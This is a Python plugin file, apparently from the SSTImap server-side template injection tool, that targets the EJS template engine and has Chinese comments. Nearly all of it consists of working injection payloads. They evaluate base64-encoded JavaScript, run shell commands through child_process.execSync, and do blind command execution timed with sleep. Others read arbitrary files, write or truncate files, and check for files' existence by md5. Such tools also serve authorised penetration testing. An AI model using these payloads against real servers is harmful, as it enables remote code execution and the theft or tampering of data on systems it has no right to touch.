from plugins.languages import javascript
from utils import rand

# TODO：process.mainModule 可能未定义，需要替换
class Ejs(javascript.Javascript):
    generic_plugin = True
    priority = 5
    plugin_info = {
        "Description": 'EJS模板引擎',
        "Authors": [
            "Yuji Matsunaga @jx6f https://github.com/jx6f",  # 原始 Tplmap 载荷
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # SSTImap 更新
        ],
        "Engine": [
            "Homepage: https://ejs.co/",
            "Github: https://github.com/mde/ejs",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'header': """<%= {header[0]}+{header[1]} %>""",
                'trailer': """<%= {trailer[0]}+{trailer[1]} %>""",
                'render': '{code}',
                'test_render': f'<%= typeof({rand.randints[0]})+{rand.randints[1]} %>',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'render_error': {
                'header': """<%=''['x'][({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]%>""",
            },
            'evaluate': {
                'evaluate': """<%=eval(Buffer('{code_b64p}', 'base64').toString())%>""",
                'test_os': """global.process.mainModule.require('os').platform()"""
                # 'test_os': """进程.平台"""
            },
            'evaluate_error': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """<%=[""][0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]%>"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """<%=eval(Buffer('{code_b64p}', 'base64').toString())&&global.process.mainModule.require('child_process').execSync('sleep {delay}')%>"""
            },
            'execute': {
                'execute': """<%= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString()) %>"""
                # '执行': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString()], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).输出[1]%>"""
            },
            'execute_error': {
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell 选项已在 Node 5.7 中引入，因此这不适用于旧的 Node 版本。
                # TODO：使用另一个函数。
                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            'execute_blind': {
                'execute_blind': """<%global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')%>"""
                # 'execute_blind': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString() + ' && 睡眠{delay}'], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
            },
            'write': {
                'write': """<%global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')%>""",
                'truncate': """<%global.process.mainModule.require('fs').writeFileSync('{path}', '')%>"""
            },
            'read': {
                'read': """<%=global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')%>"""
            },
            'read_error': {
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'md5': """<%=global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")%>"""
            },
            'md5_error': {
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
            },
            'md5_blind': {
                'call': 'evaluate_blind',
                'md5_blind': "global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
                'exists_blind': "global.process.mainModule.require('fs').existsSync('{path}')"
            },
        })

        self.set_contexts([
            # 文本上下文，无闭包
            {'level': 0},
            {'level': 1, 'prefix': '{closure}%>', 'suffix': '<%#', 'closures': javascript.ctx_closures},
            {'level': 2, 'prefix': '{closure}%>', 'suffix': '<%#', 'closures': {1: ["'", ')'], 2: ['"', ')']}},
            {'level': 3, 'prefix': '*/%>', 'suffix': '<%#'},
        ])
